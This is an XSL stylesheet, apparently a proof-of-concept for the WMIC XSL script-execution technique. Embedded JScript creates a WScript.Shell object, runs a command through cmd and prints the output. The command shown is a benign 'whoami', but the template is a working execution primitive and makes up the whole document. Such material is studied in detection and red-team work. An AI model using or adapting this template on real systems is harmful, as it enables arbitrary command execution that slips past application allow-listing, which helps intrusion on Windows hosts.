<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    xmlns:user="urn:my-scripts">

    <xsl:output method="text" />

    <msxsl:script language="JScript" implements-prefix="user">
        <![CDATA[
        function execCommand(cmd) {
            try {
                var shell = new ActiveXObject("WScript.Shell");
                var exec = shell.Exec(cmd);
                var output = "";
                while (!exec.StdOut.AtEndOfStream) {
                    output += exec.StdOut.ReadLine() + "\n";
                }
                return output;
            } catch (e) {
                return "Error: " + e.message;
            }
        }
        ]]>
    </msxsl:script>

    <xsl:template match="/">
        <xsl:text>WMIC XSL POC Output:</xsl:text>
        <xsl:text>&#10;</xsl:text>
        <xsl:value-of select="user:execCommand('cmd /c whoami')" />
    </xsl:template>

</xsl:stylesheet>
